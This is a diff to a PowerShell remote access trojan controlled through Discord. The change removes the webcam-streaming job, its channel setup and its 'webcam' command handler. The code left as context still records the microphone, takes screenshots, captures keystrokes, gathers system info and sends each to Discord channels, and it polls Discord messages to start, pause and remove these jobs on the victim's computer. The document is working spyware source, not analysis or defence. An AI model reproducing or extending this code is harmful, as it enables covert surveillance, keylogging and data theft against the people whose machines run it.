@@ -305,7 +305,6 @@ $script:jsonPayload = @{
 
 ### JOBS
 - **Microphone**: Record microphone clips and send to Discord
-- **Webcam**: Stream webcam pictures to Discord
 - **Screenshots**: Sends screenshots of the desktop to Discord
 - **Keycapture**: Capture Keystrokes and send to Discord
 - **SystemInfo**: Gather System Info and send to Discord
@@ -1722,11 +1721,8 @@ $screenJob = {
     }
 }
 
-# Scriptblock for webcam screenshots to discord
-
 # Function to start all jobs upon script execution
 function StartAll{
-    Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID, $global:WebcamWebhook
     sleep 1
     Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID, $global:ScreenshotWebhook
     sleep 1
@@ -1802,9 +1798,6 @@ $global:ch = $ChannelID
 sleep 1
 NewChannel -name 'screenshots'
 $global:ScreenshotID = $ChannelID
-sleep 1
-NewChannel -name 'webcam'
-$global:WebcamID = $ChannelID
 sleep 1
 NewChannel -name 'microphone'
 $global:MicrophoneID = $ChannelID
@@ -1896,19 +1889,11 @@ while ($true) {
     if ($latestMessageId -ne $lastMessageId) {
         $lastMessageId = $latestMessageId
         $global:latestMessageContent = $messages
-        $camrunning = Get-Job -Name Webcam
         $sceenrunning = Get-Job -Name Screen
         $audiorunning = Get-Job -Name Audio
         $PSrunning = Get-Job -Name PSconsole
         $lootrunning = Get-Job -Name Info
         $keysrunning = Get-Job -Name Keys
-        if ($messages -eq 'webcam'){
-            if (!($camrunning)){
-                Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
-                sendMsg -Message ":camera: ``$env:COMPUTERNAME Webcam Session Started!`` :camera:"
-            }
-            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
-        }
         if ($messages -eq 'screenshots'){
             if (!($sceenrunning)){
                 Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID
@@ -1947,12 +1932,10 @@ while ($true) {
         if ($messages -eq 'pausejobs'){
             Stop-Job -Name Audio
             Stop-Job -Name Screen
-            Stop-Job -Name Webcam
             Stop-Job -Name PSconsole
             Stop-Job -Name Keys
             Remove-Job -Name Audio
             Remove-Job -Name Screen
-            Remove-Job -Name Webcam
             Remove-Job -Name PSconsole
             Remove-Job -Name Keys
             sendMsg -Message ":no_entry: ``Stopped All Jobs! : $env:COMPUTERNAME`` :no_entry:"   
